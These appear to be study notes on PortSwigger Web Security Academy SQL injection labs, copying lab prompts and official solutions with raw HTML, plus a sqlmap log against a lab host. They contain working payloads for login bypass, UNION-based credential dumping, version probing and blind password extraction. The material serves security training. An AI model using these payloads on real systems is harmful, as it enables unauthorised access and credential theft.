## SQL injection

https://portswigger.net/web-security/sql-injection

https://portswigger.net/web-security/sql-injection/cheat-sheet



#### SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

> This lab contains an SQL injection vulnerability in the product category filter. When the user selects a  category, the application carries out an SQL query like the following:  `SELECT * FROM products WHERE category = 'Gifts' AND released = 1`
>
> To solve the lab, perform an SQL injection attack that  causes the application to display details of all products in any  category, both released and unreleased. 

<div class="component-solution is-expandable">
            <h4>Solution<svg xmlns="http://www.w3.org/2000/svg" width="18" height="9" viewBox="0 0 18 9"><polygon points="17 -0.01 9 7.01 1 -0.01 0 1.09 9 8.99 18 1.09 17 -0.01"></polygon></svg></h4>
            <div>
                <ol>
                    <li>
                        Use Burp Suite to intercept and modify the request that sets the product category filter.
                    </li>
                    <li>
                        Modify the <code>category</code> parameter, giving it the value <code>'+OR+1=1--</code>
                    </li>
                    <li>
                        Submit the request, and verify that the response now contains additional items.
                    </li>
                </ol>
            </div>
        </div>

exploit

```bash
# sqlmap -u 'https://ac031f4f1fa723cac0347af000d900ca.web-security-academy.net/filter?category=Pets' --dbs -v 3
---
Parameter: category (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: category=Pets' AND 8991=8991 AND 'bneO'='bneO
    Vector: AND [INFERENCE]

    Type: UNION query
    Title: Generic UNION query (NULL) - 8 columns
    Payload: category=Pets' UNION ALL SELECT NULL,NULL,(CHR(113)||CHR(120)||CHR(98)||CHR(106)||CHR(113))||(CHR(76)||CHR(71)||CHR(112)||CHR(81)||CHR(109)||CHR(97)||CHR(71)||CHR(109)||CHR(90)||CHR(70)||CHR(104)||CHR(83)||CHR(115)||CHR(90)||CHR(86)||CHR(76)||CHR(80)||CHR(72)||CHR(106)||CHR(75)||CHR(116)||CHR(81)||CHR(119)||CHR(108)||CHR(67)||CHR(73)||CHR(78)||CHR(78)||CHR(86)||CHR(114)||CHR(109)||CHR(112)||CHR(77)||CHR(105)||CHR(97)||CHR(68)||CHR(112)||CHR(106)||CHR(74)||CHR(69))||(CHR(113)||CHR(120)||CHR(120)||CHR(118)||CHR(113)),NULL,NULL,NULL,NULL,NULL-- oruZ
    Vector:  UNION ALL SELECT NULL,NULL,[QUERY],NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
---

## --dbs
[00:44:58] [PAYLOAD] Pets' AND ASCII(SUBSTRING((COALESCE(CAST(CURRENT_SCHEMA() AS VARCHAR(10000))::text,(CHR(32))))::text FROM 7 FOR 1))>1 AND 'bHAs'='bHAs
[00:45:01] [INFO] retrieved: public

# --tables
[00:46:06] [INFO] retrieved: 1
[00:46:06] [DEBUG] performed 6 queries in 6.79 seconds
[00:46:06] [PAYLOAD] Pets' AND ASCII(SUBSTRING((SELECT COALESCE(CAST(tablename AS VARCHAR(10000))::text,(CHR(32))) FROM pg_tables WHERE schemaname=(CHR(112)||CHR(117)||CHR(98)||CHR(108)||CHR(105)||CHR(99)) ORDER BY tablename OFFSET 0 LIMIT 1)::text FROM 1 FOR 1))>64 AND 'mEXN'='mEXN
[00:46:07] [PAYLOAD] Pets' AND ASCII(SUBSTRING((SELECT COALESCE(CAST(tablename AS VARCHAR(10000))::text,(CHR(32))) FROM pg_tables WHERE schemaname=(CHR(112)||CHR(117)||CHR(98)||CHR(108)||CHR(105)||CHR(99)) ORDER BY tablename OFFSET 0 LIMIT 1)::text FROM 1 FOR 1))>96 AND 'mEXN'='mEXN
[00:46:08] [PAYLOAD] Pets' AND ASCII(SUBSTRING((SELECT COALESCE(CAST(tablename AS VARCHAR(10000))::text,(CHR(32))) FROM pg_tables WHERE schemaname=(CHR(112)||CHR(117)||CHR(98)||CHR(108)||CHR(105)||CHR(99)) ORDER BY tablename OFFSET 0 LIMIT 1)::text FROM 1 FOR 1))>112 AND 'mEXN'='mEXN
[00:46:09] [PAYLOAD] Pets' AND ASCII(SUBSTRING((SELECT COALESCE(CAST(tablename AS VARCHAR(10000))::text,(CHR(32))) FROM pg_tables WHERE schemaname=(CHR(112)||CHR(117)||CHR(98)||CHR(108)||CHR(105)||CHR(99)) ORDER BY tablename OFFSET 0 LIMIT 1)::text FROM 1 FOR 1))>104 AND 'mEXN'='mEXN
[00:46:10] [PAYLOAD] Pets' AND ASCII(SUBSTRING((SELECT COALESCE(CAST(tablename AS VARCHAR(10000))::text,(CHR(32))) FROM pg_tables WHERE schemaname=(CHR(112)||CHR(117)||CHR(98)||CHR(108)||CHR(105)||CHR(99)) ORDER BY tablename OFFSET 0 LIMIT 1)::text FROM 1 FOR 1))>108 AND 'mEXN'='mEXN
[00:46:11] [PAYLOAD] Pets' AND ASCII(SUBSTRING((SELECT COALESCE(CAST(tablename AS VARCHAR(10000))::text,(CHR(32))) FROM pg_tables WHERE schemaname=(CHR(112)||CHR(117)||CHR(98)||CHR(108)||CHR(105)||CHR(99)) ORDER BY tablename OFFSET 0 LIMIT 1)::text FROM 1 FOR 1))>110 AND 'mEXN'='mEXN
[00:46:12] [PAYLOAD] Pets' AND ASCII(SUBSTRING((SELECT COALESCE(CAST(tablename AS VARCHAR(10000))::text,(CHR(32))) FROM pg_tables WHERE schemaname=(CHR(112)||CHR(117)||CHR(98)||CHR(108)||CHR(105)||CHR(99)) ORDER BY tablename OFFSET 0 LIMIT 1)::text FROM 1 FOR 1))>111 AND 'mEXN'='mEXN
[00:47:25] [PAYLOAD] Pets' AND ASCII(SUBSTRING((SELECT COALESCE(CAST(tablename AS VARCHAR(10000))::text,(CHR(32))) FROM pg_tables WHERE schemaname=(CHR(112)||CHR(117)||CHR(98)||CHR(108)||CHR(105)||CHR(99)) ORDER BY tablename OFFSET 0 LIMIT 1)::text FROM 8 FOR 1))>96 AND 'mEXN'='mEXN
[00:47:28] [PAYLOAD] Pets' AND ASCII(SUBSTRING((SELECT COALESCE(CAST(tablename AS VARCHAR(10000))::text,(CHR(32))) FROM pg_tables WHERE schemaname=(CHR(112)||CHR(117)||CHR(98)||CHR(108)||CHR(105)||CHR(99)) ORDER BY tablename OFFSET 0 LIMIT 1)::text FROM 8 FOR 1))>112 AND 'mEXN'='mEXN
[00:47:31] [PAYLOAD] Pets' AND ASCII(SUBSTRING((SELECT COALESCE(CAST(tablename AS VARCHAR(10000))::text,(CHR(32))) FROM pg_tables WHERE schemaname=(CHR(112)||CHR(117)||CHR(98)||CHR(108)||CHR(105)||CHR(99)) ORDER BY tablename OFFSET 0 LIMIT 1)::text FROM 8 FOR 1))>120 AND 'mEXN'='mEXN
[00:47:32] [PAYLOAD] Pets' AND ASCII(SUBSTRING((SELECT COALESCE(CAST(tablename AS VARCHAR(10000))::text,(CHR(32))) FROM pg_tables WHERE schemaname=(CHR(112)||CHR(117)||CHR(98)||CHR(108)||CHR(105)||CHR(99)) ORDER BY tablename OFFSET 0 LIMIT 1)::text FROM 8 FOR 1))>116 AND 'mEXN'='mEXN
[00:47:33] [PAYLOAD] Pets' AND ASCII(SUBSTRING((SELECT COALESCE(CAST(tablename AS VARCHAR(10000))::text,(CHR(32))) FROM pg_tables WHERE schemaname=(CHR(112)||CHR(117)||CHR(98)||CHR(108)||CHR(105)||CHR(99)) ORDER BY tablename OFFSET 0 LIMIT 1)::text FROM 8 FOR 1))>114 AND 'mEXN'='mEXN
[00:47:35] [PAYLOAD] Pets' AND ASCII(SUBSTRING((SELECT COALESCE(CAST(tablename AS VARCHAR(10000))::text,(CHR(32))) FROM pg_tables WHERE schemaname=(CHR(112)||CHR(117)||CHR(98)||CHR(108)||CHR(105)||CHR(99)) ORDER BY tablename OFFSET 0 LIMIT 1)::text FROM 8 FOR 1))>115 AND 'mEXN'='mEXN
[00:47:37] [PAYLOAD] Pets' AND ASCII(SUBSTRING((SELECT COALESCE(CAST(tablename AS VARCHAR(10000))::text,(CHR(32))) FROM pg_tables WHERE schemaname=(CHR(112)||CHR(117)||CHR(98)||CHR(108)||CHR(105)||CHR(99)) ORDER BY tablename OFFSET 0 LIMIT 1)::text FROM 9 FOR 1))>96 AND 'mEXN'='mEXN
[00:47:45] [PAYLOAD] Pets' AND ASCII(SUBSTRING((SELECT COALESCE(CAST(tablename AS VARCHAR(10000))::text,(CHR(32))) FROM pg_tables WHERE schemaname=(CHR(112)||CHR(117)||CHR(98)||CHR(108)||CHR(105)||CHR(99)) ORDER BY tablename OFFSET 0 LIMIT 1)::text FROM 9 FOR 1))>48 AND 'mEXN'='mEXN
[00:47:46] [PAYLOAD] Pets' AND ASCII(SUBSTRING((SELECT COALESCE(CAST(tablename AS VARCHAR(10000))::text,(CHR(32))) FROM pg_tables WHERE schemaname=(CHR(112)||CHR(117)||CHR(98)||CHR(108)||CHR(105)||CHR(99)) ORDER BY tablename OFFSET 0 LIMIT 1)::text FROM 9 FOR 1))>1 AND 'mEXN'='mEXN
[00:47:47] [INFO] retrieved: products
[00:47:47] [DEBUG] performed 52 queries in 100.70 seconds
Database: public
[1 table]
+----------+
| products |
+----------+

back-end DBMS: PostgreSQL
[00:58:24] [INFO] fetching columns for table 'products' in database 'public'
[00:58:24] [DEBUG] stripping ORDER BY clause from statement because it does not play well with UNION query SQL injection
[00:58:24] [PAYLOAD] Pets' UNION ALL SELECT NULL,NULL,ARRAY_AGG((CHR(113)||CHR(120)||CHR(98)||CHR(106)||CHR(113))||COALESCE(attname::text,(CHR(32)))||(CHR(118)||CHR(106)||CHR(105)||CHR(101)||CHR(106)||CHR(109))||COALESCE(typname::text,(CHR(32)))||(CHR(113)||CHR(120)||CHR(120)||CHR(118)||CHR(113)))::text,NULL,NULL,NULL,NULL,NULL FROM pg_attribute b JOIN pg_class a ON a.oid=b.attrelid JOIN pg_type c ON c.oid=b.atttypid JOIN pg_namespace d ON a.relnamespace=d.oid WHERE b.attnum>0 AND a.relname=(CHR(112)||CHR(114)||CHR(111)||CHR(100)||CHR(117)||CHR(99)||CHR(116)||CHR(115)) AND nspname=(CHR(112)||CHR(117)||CHR(98)||CHR(108)||CHR(105)||CHR(99))-- cfoW

Database: public
Table: products
[8 columns]
+-------------+---------+
| Column      | Type    |
+-------------+---------+
| category    | varchar |
| description | varchar |
| id          | int4    |
| image       | varchar |
| name        | varchar |
| price       | int4    |
| rating      | int4    |
| released    | int4    |
+-------------+---------+
```

#### SQL injection vulnerability allowing login bypass

> This lab contains an SQL injection vulnerability in the login function.
>
> To solve the lab, perform an SQL injection attack that logs in to the application as the `administrator` user. 

<div class="component-solution is-expandable">
            <h4>Solution<svg xmlns="http://www.w3.org/2000/svg" width="18" height="9" viewBox="0 0 18 9"><polygon points="17 -0.01 9 7.01 1 -0.01 0 1.09 9 8.99 18 1.09 17 -0.01"></polygon></svg></h4>
            <div>
                <ol>
                    <li>
                        Use Burp Suite to intercept and modify the login request.
                    </li>
                    <li>
                        Modify the <code>username</code> parameter, giving it the value: <code>administrator'--</code>
                    </li>
                </ol>
            </div>
        </div>



#### SQL injection UNION attack, determining the number of columns returned by the query

> This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. The first step of such an attack is to determine the number of columns that are being returned by the query. You will then use this technique in subsequent labs to construct the full attack. To solve the lab, determine the number of columns returned by the query by performing an SQL injection UNION attack that returns an additional row containing null values.

<div class="component-solution is-expandable">
            <h4>Solution<svg xmlns="http://www.w3.org/2000/svg" width="18" height="9" viewBox="0 0 18 9"><polygon points="17 -0.01 9 7.01 1 -0.01 0 1.09 9 8.99 18 1.09 17 -0.01"></polygon></svg></h4>
            <div>
                <ol>
                    <li>
                        Use Burp Suite to intercept and modify the request that sets the product category filter.
                    </li>
                    <li>
                        Modify the <code>category</code> parameter, giving it the value <code>'+UNION+SELECT+NULL--</code>. Observe that an error occurs.
                    </li>
                    <li>
                        <p>
                            Modify the <code>category</code> parameter to add an additional column containing a null value:
                        </p>
                        <code class="code-scrollable">'+UNION+SELECT+NULL,NULL--</code>
                    </li>
                    <li>
                        Continue adding null values until the error disappears and the response includes additional content containing the null values.
                    </li>
                </ol>
            </div>
        </div>



#### SQL injection UNION attack, finding a column containing text

> This lab contains an SQL injection vulnerability in the  product category filter. The results from the query are returned in the  application's response, so you can use a UNION attack to retrieve data  from other tables. To construct such an attack, you first need to  determine the number of columns returned by the query. You can do this  using a technique you learned in a previous lab. The next step is to identify a column that is compatible with string data.        
>
> The lab will provide a random value that you need to make  appear within the query results. To solve the lab, perform an SQL injection UNION attack that returns an additional row containing the value provided.  This technique helps you determine which columns are compatible with  string data.        

<div class="component-solution is-expandable expanded">
            <h4>Solution<svg xmlns="http://www.w3.org/2000/svg" width="18" height="9" viewBox="0 0 18 9"><polygon points="17 -0.01 9 7.01 1 -0.01 0 1.09 9 8.99 18 1.09 17 -0.01"></polygon></svg></h4>
            <div>
                <ol>
                    <li>
                        Use Burp Suite to intercept and modify the request that sets the product category filter.
                    </li>
                    <li>
                        <p>
                            Determine thenumber of columns that are being returned by the query. Verify that the query is returning three columns, using the following payload in the <code>category</code> parameter:
                        </p>
                        <code class="code-scrollable">'+UNION+SELECT+NULL,NULL,NULL--</code>
                    </li>
                    <li>
                        <p>
                            Try replacing each null with the random value provided by the lab, for example:
                        </p>
                        <code class="code-scrollable">'+UNION+SELECT+'abcdef',NULL,NULL--</code>
                    </li>
                    <li>
                        If an error occurs, move on to the next null and try that instead.
                    </li>
                </ol>
            </div>
        </div>



#### SQL injection UNION attack, retrieving data from other tables

> This lab contains an SQL injection vulnerability in the  product category filter. The results from the query are returned in the  application's response, so you can use a UNION attack to retrieve data  from other tables. To construct such an attack, you need to combine some of the techniques you learned in previous labs.        
>
> The database contains a different table called `users`, with columns called `username` and `password`.        
>
> To solve the lab, perform an SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the `administrator` user.        

<div class="component-solution is-expandable">
            <h4>Solution<svg xmlns="http://www.w3.org/2000/svg" width="18" height="9" viewBox="0 0 18 9"><polygon points="17 -0.01 9 7.01 1 -0.01 0 1.09 9 8.99 18 1.09 17 -0.01"></polygon></svg></h4>
            <div>
                <ol>
                    <li>
                        Use Burp Suite to intercept and modify the request that sets the product category filter.
                    </li>
                    <li>
                        <p>
                            Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, both of which contain text, using a payload like the following in the category parameter:
                        </p>
                        <code class="code-scrollable">'+UNION+SELECT+'abc','def'--</code>
                    </li>
                    <li>
                        <p>
                            Use the following payload to retrieve the contents of the <code>users</code> table:
                        </p>
                        <code class="code-scrollable">'+UNION+SELECT+username,+password+FROM+users--</code>
                    </li>
                    <li>
                        Verify that the application's response contains usernames and passwords.
                    </li>
                </ol>
            </div>
        </div>



#### SQL injection UNION attack, retrieving multiple values in a single column

> This lab contains an SQL injection vulnerability in the  product category filter. The results from the query are returned in the  application's response so you can use a UNION attack to retrieve data  from other tables.        
>
> The database contains a different table called `users`, with columns called `username` and `password`.        
>
> To solve the lab, perform an SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the `administrator` user. 

<div class="component-solution is-expandable">
            <h4>Solution<svg xmlns="http://www.w3.org/2000/svg" width="18" height="9" viewBox="0 0 18 9"><polygon points="17 -0.01 9 7.01 1 -0.01 0 1.09 9 8.99 18 1.09 17 -0.01"></polygon></svg></h4>
            <div>
                <ol>
                    <li>
                        Use Burp Suite to intercept and modify the request that sets the product category filter.
                    </li>
                    <li>
                        <p>
                            Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, only one of which contain text, using a payload like the following in the <code>category</code> parameter:
                        </p>
                        <code class="code-scrollable">'+UNION+SELECT+NULL,'abc'--</code>
                    </li>
                    <li>
                        <p>
                            Use the following payload to retrieve the contents of the <code>users</code> table:
                        </p>
                        <code class="code-scrollable">'+UNION+SELECT+NULL,username||'~'||password+FROM+users--</code>
                    </li>
                    <li>
                        Verify that the application's response contains usernames and passwords.
                    </li>
                </ol>
            </div>
        </div>



#### SQL injection attack, querying the database type and version on Oracle

> This lab contains an SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.        
>
> To solve the lab, display the database version string.

Hint

> On Oracle databases, every SELECT statement must specify a table to select FROM. If your UNION SELECT attack does not query from a table, you will still need to include the FROM keyword followed by a valid table name.
>
> There is a built-in table on Oracle called dual which you can use for this purpose. 
>
> For example: UNION SELECT 'abc' FROM dual

<div class="component-solution is-expandable">
            <h4>Solution<svg xmlns="http://www.w3.org/2000/svg" width="18" height="9" viewBox="0 0 18 9"><polygon points="17 -0.01 9 7.01 1 -0.01 0 1.09 9 8.99 18 1.09 17 -0.01"></polygon></svg></h4>
            <div>
                <ol>
                    <li>
                        Use Burp Suite to intercept and modify the request that sets the product category filter.
                    </li>
                    <li>
                        <p>
                            Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, both of which contain text, using a payload like the following in the <code>category</code> parameter:
                        </p>
                        <code class="code-scrollable">'+UNION+SELECT+'abc','def'+FROM+dual--</code>
                    </li>
                    <li>
                        <p>
                            Use the following payload to display the database version:
                        </p>
                        <code class="code-scrollable">'+UNION+SELECT+BANNER,+NULL+FROM+v$version--</code>
                    </li>
                </ol>
            </div>
        </div>



#### SQL injection attack, querying the database type and version on MySQL and Microsoft

> This lab contains an SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.        
>
> To solve the lab, display the database version string.        

<div class="component-solution is-expandable">
            <h4>Solution<svg xmlns="http://www.w3.org/2000/svg" width="18" height="9" viewBox="0 0 18 9"><polygon points="17 -0.01 9 7.01 1 -0.01 0 1.09 9 8.99 18 1.09 17 -0.01"></polygon></svg></h4>
            <div>
                <ol>
                    <li>
                        Use Burp Suite to intercept and modify the request that sets the product category filter.
                    </li>
                    <li>
                        <p>
                            Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, both of which contain text, using a payload like the following in the <code>category</code> parameter:
                        </p>
                        <code class="code-scrollable">'+UNION+SELECT+'abc','def'#</code>
                    </li>
                    <li>
                        <p>
                            Use the following payload to display the database version:
                        </p>
                        <code class="code-scrollable">'+UNION+SELECT+@@version,+NULL#</code>
                    </li>
                </ol>
            </div>
        </div>



#### SQL injection attack, listing the database contents on non-Oracle databases

> This lab contains an SQL injection vulnerability in the product category filter. The results from the  query are returned in the application's response so you can use a UNION  attack to retrieve data from other tables.        
>
> The application has a login function, and the database  contains a table that holds usernames and passwords. You need to  determine the name of this table and the columns it contains, then  retrieve the contents of the table to obtain the username and password  of all users.        
>
> To solve the lab, log in as the `administrator` user.        

<div class="component-solution is-expandable">
            <h4>Solution<svg xmlns="http://www.w3.org/2000/svg" width="18" height="9" viewBox="0 0 18 9"><polygon points="17 -0.01 9 7.01 1 -0.01 0 1.09 9 8.99 18 1.09 17 -0.01"></polygon></svg></h4>
            <div>
                <ol>
                    <li>
                        Use Burp Suite to intercept and modify the request that sets the product category filter.
                    </li>
                    <li>
                        <p>
                            Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, both of which contain text, using a payload like the following in the <code>category</code> parameter:
                        </p>
                        <code class="code-scrollable">'+UNION+SELECT+'abc','def'--</code>
                    </li>
                    <li>
                        <p>
                            Use the following payload to retrieve the list of tables in the database:
                        </p>
                        <code class="code-scrollable">'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--</code>
                    </li>
                    <li>
                        Find the name of the table containing user credentials.
                    </li>
                    <li>
                        <p>
                            Use the following payload (replacing the table name) to retrieve the details of the columns in the table:
                        </p>
                        <code class="code-scrollable">'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--</code>
                    </li>
                    <li>
                        Find the names of the columns containing usernames and passwords.
                    </li>
                    <li>
                        <p>
                            Use the following payload (replacing the table and column names) to retrieve the usernames and passwords for all users:
                        </p>
                        <code class="code-scrollable">'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--</code>
                    </li>
                    <li>
                        Find the password for the <code>administrator</code> user, and use it to log in.
                    </li>
                </ol>
            </div>
        </div>



#### SQL injection attack, listing the database contents on Oracle

> This lab contains an SQL injection vulnerability in the product category filter. The results from the  query are returned in the application's response so you can use a UNION  attack to retrieve data from other tables.        
>
> The application has a login function, and the database  contains a table that holds usernames and passwords. You need to  determine the name of this table and the columns it contains, then  retrieve the contents of the table to obtain the username and password  of all users.        
>
> To solve the lab, log in as the `administrator` user.

<div class="component-solution is-expandable">
            <h4>Solution<svg xmlns="http://www.w3.org/2000/svg" width="18" height="9" viewBox="0 0 18 9"><polygon points="17 -0.01 9 7.01 1 -0.01 0 1.09 9 8.99 18 1.09 17 -0.01"></polygon></svg></h4>
            <div>
                <ol>
                    <li>
                        Use Burp Suite to intercept and modify the request that sets the product category filter.
                    </li>
                    <li>
                        <p>
                            Determine the number of columns that are being returned by the query and which columns contain text data. Verify that the query is returning two columns, both of which contain text, using a payload like the following in the <code>category</code> parameter:
                        </p>
                        <code class="code-scrollable">'+UNION+SELECT+'abc','def'+FROM+dual--</code>
                    </li>
                    <li>
                        <p>
                            Use the following payload to retrieve the list of tables in the database:
                        </p>
                        <code class="code-scrollable">'+UNION+SELECT+table_name,NULL+FROM+all_tables--</code>
                    </li>
                    <li>
                        Find the name of the table containing user credentials.
                    </li>
                    <li>
                        <p>
                            Use the following payload (replacing the table name) to retrieve the details of the columns in the table:
                        </p>
                        <code class="code-scrollable">'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'--</code>
                    </li>
                    <li>
                        Find the names of the columns containing usernames and passwords.
                    </li>
                    <li>
                        <p>
                            Use the following payload (replacing the table and column names) to retrieve the usernames and passwords for all users:
                        </p>
                        <code class="code-scrollable">'+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_ABCDEF--</code>
                    </li>
                    <li>
                        Find the password for the <code>administrator</code> user, and use it to log in.
                    </li>
                </ol>
            </div>
        </div>



#### Blind SQL injection with conditional responses

> This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics,  and performs an SQL query containing the value of the submitted cookie.        
>
> The results of the SQL query are not returned, and no error  messages are displayed. But the application includes a "Welcome back"  message in the page if the query returns any rows.        
>
> The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.        
>
> To solve the lab, log in as the `administrator` user.        

<div class="component-solution is-expandable expanded">
            <h4>Official Solution<svg xmlns="http://www.w3.org/2000/svg" width="18" height="9" viewBox="0 0 18 9"><polygon points="17 -0.01 9 7.01 1 -0.01 0 1.09 9 8.99 18 1.09 17 -0.01"></polygon></svg></h4>
            <div>
                <ol>
                    <li>
                        Visit the front page of the shop, and use Burp Suite to intercept and modify the request containing the <code>TrackingId</code> cookie. For simplicity, let's say the original value of the cookie is <code>TrackingId=xyz</code>.
                    </li>
                    <li>
                        <p>
                            Modify the <code>TrackingId</code> cookie, changing it to:
                        </p>
                        <code class="code-scrollable">TrackingId=xyz' AND '1'='1</code>
                        <p>
                            Verify that the "Welcome back" message appears in the response.
                        </p>
                    </li>
                    <li>
                        <p>
                            Now change it to:
                        </p>
                        <code class="code-scrollable">TrackingId=xyz' AND '1'='2</code>
                        <p>
                            Verify that the "Welcome back" message does not appear in the response. This demonstrates how you can test a single boolean condition and infer the result.
                        </p>
                    </li>
                    <li>
                        <p>
                            Now change it to:
                        </p>
                        <code class="code-scrollable">TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a</code>
                        <p>
                            Verify that the condition is true, confirming that there is a table called <code>users</code>.
                        </p>
                    </li>
                    <li>
                        <p>
                            Now change it to:
                        </p>
                        <code class="code-scrollable">TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a</code>
                        <p>
                            Verify that the condition is true, confirming that there is a user called <code>administrator</code>.
                        </p>
                    </li>
                    <li>
                        <p>
                            The next step is to determine how many characters are in the password of the <code>administrator</code> user. To do this, change the value to:
                        </p>
                        <code class="code-scrollable">TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)&gt;1)='a</code>
                        <p>
                            This condition should be true, confirming that the password is greater than 1 character in length.
                        </p>
                    </li>
                    <li>
                        <p>
                            Send a series of follow-up values to test different password lengths. Send:
                        </p>
                        <code class="code-scrollable">TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)&gt;2)='a</code>
                        <p>
                            Then send:
                        </p>
                        <code class="code-scrollable">TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)&gt;3)='a</code>
                        <p>
                            And so on. You can do this manually using Burp Repeater, since the length is likely to be short. When the condition stops being true (i.e. when the "Welcome back" message disappears), you have determined the length of the password, which is in fact 20 characters long.
                        </p>
                    </li>
                    <li>
                        After determining the length of the password, the next step is to test the character at each position to determine its value. This involves a much larger number of requests, so you need to use Burp Intruder. Send the request you are working on to Burp Intruder, using the context menu.
                    </li>
                    <li>
                        In the Positions tab of Burp Intruder, clear the default payload positions by clicking the "Clear §" button.
                    </li>
                    <li>
                        <p>
                            In the Positions tab, change the value of the cookie to:
                        </p>
                        <code class="code-scrollable">TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a</code>
                        <p>
                            This uses the <code>SUBSTRING()</code> function to extract a single character from the password, and test it against a specific value. Our attack will cycle through each position and possible value, testing each one in turn.
                        </p>
                    </li>
                    <li>
                        <p>
                            Place payload position markers around the final <code>a</code> character in the cookie value. To do this, select just the <code>a</code>, and click the "Add §" button. You should then see the following as the cookie value (note the payload position markers):
                        </p>
                        <code class="code-scrollable">TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§</code>
                    </li>
                    <li>
                        To test the character at each position, you'll need to send suitable payloads in the payload position that you've defined. You can assume that the password contains only lowercase alphanumeric characters. Go to the Payloads tab, check that "Simple list" is selected, and under "Payload Options" add the payloads in the range a - z and 0 - 9. You can select these easily using the "Add from list" drop-down.
                    </li>
                    <li>
                        To be able to tell when the correct character was submitted, you'll need to grep each response for the expression "Welcome back". To do this, go to the Options tab, and the "Grep - Match" section. Clear any existing entries in the list, and then add the value "Welcome back".
                    </li>
                    <li>
                        Launch the attack by clicking the "Start attack" button or selecting "Start attack" from the Intruder menu.
                    </li>
                    <li>
                        Review the attack results to find the value of the character at the first position. You should see a column in the results called "Welcome back". One of the rows should have a tick in this column. The payload showing for that row is the value of the character at the first position.
                    </li>
                    <li>
                        <p>                    Now, you simply need to re-run the attack for each of the other character positions in the password, to determine their value. To do this, go back to the main Burp window, and the Positions tab of Burp Intruder, and change the specified offset from 1 to 2. You should then see the following as the cookie value:
                    </p>
                    <code class="code-scrollable">TrackingId=xyz' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='a</code>
                </li>
                <li>
                    Launch the modified attack, review the results, and note the character at the second offset.
                </li>
                <li>
                    Continue this process testing offset 3, 4, and so on, until you have the whole password.
                </li>
                <li>
                    In the browser, click "My account" to open the login page. Use the password to log in as the <code>administrator</code> user.
                </li>
            </ol>
            <div class="component-notes">
                Note
                <p>
                    For more advanced users, the solution described here could be made more elegant in various ways. For example, instead of iterating over every character, you could perform a binary search of the character space. Or you could create a single Intruder attack with two payload positions and the "Cluster bomb" attack type, and work through all permutations of offsets and character values.
                </p>
            </div>
        </div>
    </div>



#### Blind SQL injection with conditional errors

> This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics,  and performs an SQL query containing the value of the submitted cookie. 
>
> The results of the SQL query are not returned, and the  application does not respond any differently based on whether the query  returns any rows. If the SQL query causes an error, then the application returns a custom error message. 
>
> The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.        
>
> To solve the lab, log in as the `administrator` user.

<div class="component-solution is-expandable expanded">
            <h4>Official Solution<svg xmlns="http://www.w3.org/2000/svg" width="18" height="9" viewBox="0 0 18 9"><polygon points="17 -0.01 9 7.01 1 -0.01 0 1.09 9 8.99 18 1.09 17 -0.01"></polygon></svg></h4>
            <div>
                <ol>
                    <li>
                        Visit the front page of the shop, and use Burp Suite to intercept and modify the request containing the <code>TrackingId</code> cookie. For simplicity, let's say the original value of the cookie is <code>TrackingId=xyz</code>.
                    </li>
                    <li>
                        <p>
                            Modify the <code>TrackingId</code> cookie, appending a single quotation mark to it:
                        </p>
                        <code class="code-scrollable">TrackingId=xyz'</code>
                        <p>
                            Verify that an error message is received.
                        </p>
                    </li>
                    <li>
                        Now change it to two quotation marks:
                        <code class="code-scrollable">TrackingId=xyz''</code>
                        Verify that the error disappears. This suggests that a syntax error (in this case, the unclosed quotation mark) is having a detectable effect on the response.
                    </li>
                    <li>
                        <p>
                            You now need to confirm that the server is interpreting the injection as a SQL query i.e. that the error is a SQL syntax error as opposed to any other kind of error. To do this, you first need to construct a subquery using valid SQL syntax. Try submitting:
                        </p>
                        <code class="code-scrollable">TrackingId=xyz'||(SELECT '')||'</code>
                        <p>
                            In this case, notice that the query still appears to be invalid. This may be due to the database type - try specifying a predictable table name in the query:
                        </p>
                            <code class="code-scrollable">TrackingId=xyz'||(SELECT '' FROM dual)||'</code>
                        <p>
                            As you no longer receive an error, this indicates that the target is probably using an Oracle database, which requires all <code>SELECT</code> statements to explicitly specify a table name.
                        </p>
                    </li>
                    <li>
                        <p>
                            Now that you've crafted what appears to be a valid query, try submitting an invalid query while still preserving valid SQL syntax. For example, try querying a non-existent table name:
                        </p>
                            <code>TrackingId=xyz'||(SELECT '' FROM not-a-real-table)||'</code>
                        <p>
                            This time, an error is returned. This behavior strongly suggests that your injection is being processed as a SQL query by the back-end.
                        </p>
                    </li>
                    <li>
                        <p>
